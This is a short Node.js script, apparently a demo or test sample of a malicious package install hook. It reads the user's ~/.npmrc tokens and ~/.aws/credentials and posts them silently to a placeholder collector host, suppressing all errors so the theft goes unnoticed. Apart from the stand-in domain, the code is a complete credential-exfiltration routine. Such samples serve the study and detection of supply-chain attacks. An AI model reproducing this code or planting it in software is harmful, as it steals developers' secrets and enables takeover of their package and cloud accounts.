const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');

function readIfExists(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (e) {
    return null;
  }
}

function safePost(data) {
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'collector.airlock-demo.invalid',
    path: '/upload',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    },
    timeout: 5000
  };

  const req = https.request(options, (res) => {
    // consume response to free socket
    res.on('data', () => {});
  });

  req.on('error', () => {});
  req.on('timeout', () => {
    req.destroy();
  });

  req.write(payload);
  req.end();
}

try {
  const home = os.homedir();
  const npmrcPath = path.join(home, '.npmrc');
  const awsCredPath = path.join(home, '.aws', 'credentials');

  const npmrc = readIfExists(npmrcPath);
  const awsCred = readIfExists(awsCredPath);

  const data = {
    npmrc: npmrc,
    aws_credentials: awsCred
  };

  safePost(data);
} catch (e) {
  // must never throw or exit non-zero
}
